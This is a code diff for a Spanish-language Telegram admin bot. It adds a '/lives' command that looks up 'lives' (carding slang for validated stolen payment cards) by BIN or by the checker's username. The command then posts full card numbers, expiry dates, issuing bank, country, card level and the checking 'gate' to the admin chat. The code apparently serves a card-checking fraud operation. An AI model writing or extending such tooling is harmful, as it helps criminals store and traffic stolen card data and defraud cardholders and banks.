@@ -5,7 +5,7 @@ const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 // Mantener todas las constantes necesarias, solo remover SecurityBlock
-const { Key, User, Stats, SecurityBlock, conectarDB, getLastKeys, generateKey } = require('./database');
+const { Key, User, Stats, SecurityBlock, conectarDB, getLastKeys, generateKey, getActiveUsers, Lives } = require('./database');
 const SecurityLog = require('../models/SecurityLog');
 
 // Verificar configuración crítica
@@ -277,10 +277,7 @@ const adminCommands = {
             }
 
             // Obtener usuarios activos de MongoDB
-            const activeUsers = await User.find({ 
-                'subscription.status': 'active',
-                'blockStatus.isBlocked': false
-            }).select('username subscription lastLogin createdAt');
+            const activeUsers = await getActiveUsers();
 
             if (!activeUsers || activeUsers.length === 0) {
                 await adminBot.sendMessage(msg.chat.id, '❌ No hay usuarios activos');
@@ -357,6 +354,7 @@ const adminCommands = {
             `/help - Mostrar esta ayuda\n` +
             `/block <user> <24h|48h|week|permanent> [razón] - Bloquear usuario\n` +
             `/unblock <user> - Desbloquear usuario\n` +
+            `/lives <bin|user> <valor> - Buscar lives por BIN o usuario\n` +
             `${isSuperAdmin(msg.from.id) ? 
                 `\n👑 *Comandos Super Admin*\n` +
                 `/addadmin <ID> - Agregar nuevo admin\n` +
@@ -756,6 +754,77 @@ const adminCommands = {
         } catch (error) {
             console.error('Error en comando /security:', error);
             await adminBot.sendMessage(msg.chat.id, '❌ Error al obtener el registro de seguridad');
+        }
+    },
+    '/lives': async (msg, args) => {
+        try {
+            if (!isAdmin(msg.from.id)) {
+                await logUnauthorizedAccess(msg);
+                return;
+            }
+
+            if (!args || args.length < 2) {
+                const helpMsg = `❌ *Uso correcto:*\n` +
+                    `/lives bin <número_bin> - Buscar lives por BIN\n` +
+                    `/lives user <username> - Buscar lives por usuario`;
+                
+                await adminBot.sendMessage(msg.chat.id, helpMsg, {
+                    parse_mode: 'Markdown'
+                });
+                return;
+            }
+
+            const [tipo, valor] = args;
+            let lives;
+            let mensaje;
+
+            switch (tipo.toLowerCase()) {
+                case 'bin':
+                    lives = await Lives.find({ 'detalles.bin': valor })
+                        .sort({ fechaEncontrada: -1 })
+                        .limit(10);
+                    mensaje = `🔍 *Lives encontradas para BIN ${valor}*\n\n`;
+                    break;
+
+                case 'user':
+                    lives = await Lives.find({ 'checkedBy.username': valor })
+                        .sort({ fechaEncontrada: -1 })
+                        .limit(10);
+                    mensaje = `🔍 *Lives encontradas por usuario ${valor}*\n\n`;
+                    break;
+
+                default:
+                    await adminBot.sendMessage(msg.chat.id, '❌ Tipo de búsqueda inválido. Use "bin" o "user"');
+                    return;
+            }
+
+            if (!lives || lives.length === 0) {
+                await adminBot.sendMessage(msg.chat.id, '❌ No se encontraron lives');
+                return;
+            }
+
+            mensaje += lives.map(live => 
+                `💳 *Tarjeta:* ${live.tarjeta.numero}\n` +
+                `📅 *Fecha:* ${live.tarjeta.fecha}\n` +
+                `🏦 *Banco:* ${live.detalles.banco}\n` +
+                `🌍 *País:* ${live.detalles.pais}\n` +
+                `💠 *Nivel:* ${live.detalles.nivel}\n` +
+                `🔄 *Gate:* ${live.detalles.gate}\n` +
+                `👤 *Checker:* ${live.checkedBy.username}\n` +
+                `⏰ *Fecha:* ${new Date(live.fechaEncontrada).toLocaleString()}\n`
+            ).join('\n───────────────\n\n');
+
+            // Dividir mensaje si es muy largo (límite de Telegram)
+            const chunks = mensaje.match(/.{1,4000}/g) || [];
+            for (const chunk of chunks) {
+                await adminBot.sendMessage(msg.chat.id, chunk, {
+                    parse_mode: 'Markdown'
+                });
+            }
+
+        } catch (error) {
+            console.error('Error en comando /lives:', error);
+            await adminBot.sendMessage(msg.chat.id, '❌ Error obteniendo lives');
         }
     }
 };
